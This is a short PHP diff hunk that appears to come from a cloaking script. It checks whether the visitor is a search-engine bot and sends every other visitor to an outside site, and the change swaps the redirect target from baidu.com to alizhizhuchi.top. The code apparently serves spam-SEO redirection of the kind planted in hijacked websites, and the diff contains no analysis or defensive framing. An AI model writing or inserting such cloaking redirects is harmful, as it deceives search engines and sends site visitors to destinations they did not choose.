@@ -8,7 +8,7 @@ $urlaa=$_SERVER['REQUEST_URI'];
 if(get_naps_bot() == false)
 //if(get_naps_bot() !== false)
 {
-	header("Location: http://www.baidu.com");
+	header("Location: http://www.alizhizhuchi.top");
 	exit;
 }
 else 
